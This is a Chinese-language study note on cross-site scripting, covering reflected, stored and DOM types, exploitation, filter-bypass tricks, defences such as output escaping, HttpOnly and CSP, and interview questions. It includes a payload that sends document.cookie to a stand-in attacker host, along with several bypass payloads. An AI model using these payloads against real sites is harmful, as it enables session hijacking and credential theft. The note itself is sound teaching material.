# XSS 跨站脚本学习笔记

XSS（Cross-Site Scripting，跨站脚本攻击）是 Web 安全中最常见的漏洞之一，常年位居 OWASP Top 10。本文记录 XSS 的原理、分类、利用、绕过与防御。

## 1. 原理

XSS 的本质是：Web 应用未对用户输入进行严格的过滤或转义，导致攻击者可以将恶意的 JavaScript 代码注入到网页中，当其他用户访问该页面时，浏览器会执行这些恶意代码。

**核心条件：**
1. 用户输入被当作 HTML/JS 代码解析。
2. 输出到页面时没有进行适当的编码或转义。

## 2. 分类

| 类型 | 触发方式 | 持久性 | 危害程度 |
|:---|:---|:---|:---|
| **反射型 (Reflected)** | 诱导用户点击恶意 URL，参数直接回显 | 非持久化 | 中 |
| **存储型 (Stored)** | 恶意代码存入数据库，其他用户访问时触发 | 持久化 | 高 |
| **DOM 型 (DOM-based)** | 纯前端 JS 读取 URL 参数并写入 DOM | 非持久化 | 中 |

### 反射型示例
```text
http://example.com/search?q=<script>alert(1)</script>
```
页面把 `q` 参数的内容直接输出到 HTML 中，浏览器执行了 `<script>` 标签。

### 存储型示例
在留言板提交：
```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```
恶意代码存入数据库，任何访问该留言页面的用户都会中招，Cookie 被发送到攻击者服务器。

### DOM 型示例
前端 JS 代码：
```javascript
var name = location.hash.substring(1);
document.write("Hello, " + name);
```
访问 `http://example.com/#<img src=x onerror=alert(1)>`，导致代码执行。

## 3. 利用方式

### 窃取 Cookie
```javascript
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```
如果 Cookie 未设置 HttpOnly，攻击者可以直接获取受害者的登录凭证。

### 钓鱼攻击
利用 XSS 在页面中插入一个伪造的登录框，诱导用户输入账号密码，发送给攻击者。

### BeEF 联动
使用 BeEF（Browser Exploitation Framework）接管受害者的浏览器，可以发起内网扫描、键盘记录、截屏等操作。

## 4. 绕过技巧

- **大小写混合**：`<sCript>alert(1)</sCript>`
- **双写绕过**：`<scr<script>ipt>alert(1)</script>`（如果过滤器只删除一次 `script`）
- **其他标签**：`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<body onload=alert(1)>`
- **编码绕过**：HTML 实体编码、URL 编码、Unicode 编码
- **伪协议**：`<a href="javascript:alert(1)">click</a>`

## 5. 防御建议

- **输出转义（核心）**：使用 `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` 对输出进行 HTML 实体编码。确保 `<`、`>`、`"`、`'`、`&` 都被转义。
- **输入过滤**：使用 `strip_tags()` 移除 HTML 标签，或使用白名单允许特定标签。
- **HttpOnly Cookie**：设置 `Set-Cookie: HttpOnly`，防止 JS 读取 Cookie。
- **CSP（内容安全策略）**：设置 `Content-Security-Policy` 响应头，限制脚本来源，禁止内联脚本执行。
- **WAF 辅助**：部署 WAF 拦截常见 XSS 特征，但核心还是靠代码层修复。

## 6. 面试高频问题

**Q1：XSS 的三种类型是什么？**
A：反射型（URL 参数回显）、存储型（存入数据库）、DOM 型（前端 JS 处理不当）。其中存储型危害最大，因为所有访问该页面的用户都会中招。

**Q2：如何防御 XSS？**
A：核心是**输出转义**（`htmlspecialchars`），配合输入过滤（`strip_tags`）、HttpOnly Cookie、CSP 策略。绝不能依赖黑名单过滤，因为 XSS 的绕过手法非常多。

**Q3：HttpOnly 的作用是什么？**
A：HttpOnly 是 Cookie 的一个属性，设置后 JavaScript 无法通过 `document.cookie` 读取该 Cookie，从而防止 XSS 窃取用户的登录凭证。

**Q4：DOM 型 XSS 与反射型 XSS 的区别？**
A：反射型 XSS 需要经过服务器端解析（参数回显），而 DOM 型 XSS 完全在浏览器端执行（前端 JS 直接读取 `location.hash` 或 `document.URL` 并写入 DOM），不经过服务器端，传统的服务器端 WAF 可能无法拦截。
